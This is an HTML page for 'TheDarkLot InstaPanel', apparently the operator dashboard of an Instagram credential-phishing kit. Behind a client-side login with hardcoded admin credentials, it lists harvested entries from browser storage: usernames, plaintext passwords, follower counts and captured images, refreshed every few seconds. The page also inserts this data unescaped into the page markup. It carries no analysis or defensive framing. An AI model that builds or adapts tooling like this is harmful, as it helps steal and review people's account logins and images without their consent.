<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Admin Panel | TheDarkLot</title>
  <style>
    body {
      background: #0f0f0f;
      font-family: Arial, sans-serif;
      color: #fff;
      padding: 20px;
    }
    h1 {
      color: #00ff95;
    }
    .entry {
      background: #1a1a1a;
      padding: 15px;
      border-radius: 10px;
      margin-bottom: 15px;
      box-shadow: 0 0 10px rgba(0,255,149,0.3);
    }
    img {
      max-width: 100px;
      border-radius: 5px;
    }
    .meta {
      font-size: 14px;
      margin-top: 5px;
      color: #ccc;
    }
    #login {
      background: #1a1a1a;
      padding: 20px;
      max-width: 300px;
      margin: 100px auto;
      border-radius: 10px;
      box-shadow: 0 0 15px rgba(0,255,149,0.4);
    }
    #login input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: none;
      border-radius: 5px;
    }
    #login button {
      padding: 10px;
      width: 100%;
      background: #00ff95;
      border: none;
      border-radius: 5px;
      color: #000;
      font-weight: bold;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div id="login">
    <h2>üîê Admin Login</h2>
    <input type="text" id="username" placeholder="Username" />
    <input type="password" id="password" placeholder="Password" />
    <button onclick="login()">Login</button>
    <p id="error" style="color: red;"></p>
  </div>

  <div id="dashboard" style="display: none;">
    <h1>üìã InstaPanel Admin Dashboard</h1>
    <div id="entries">Loading data...</div>
  </div>

  <script>
    const USER = "admin";
    const PASS = "thedarklot@2025";

    function login() {
      const u = document.getElementById("username").value;
      const p = document.getElementById("password").value;
      if (u === USER && p === PASS) {
        document.getElementById("login").style.display = "none";
        document.getElementById("dashboard").style.display = "block";
        loadData();
        setInterval(loadData, 5000);
      } else {
        document.getElementById("error").innerText = "‚ùå Wrong username or password!";
      }
    }

    function loadData() {
      const entries = JSON.parse(localStorage.getItem("insta_data") || "[]");
      const container = document.getElementById("entries");
      container.innerHTML = '';
      entries.reverse().forEach(entry => {
        const div = document.createElement('div');
        div.className = 'entry';
        div.innerHTML = `
          <strong>Username:</strong> @${entry.Username}<br>
          <strong>Password:</strong> ${entry.Password}<br>
          <strong>Followers:</strong> ${entry.Followers}<br>
          <div class="meta">üì∏ Captured Image:</div>
          <img src="${entry.ImageURL}" alt="Snap">
          <div class="meta">üïí ${entry.Timestamp}</div>
        `;
        container.appendChild(div);
      });
    }
  </script>
</body>
</html>
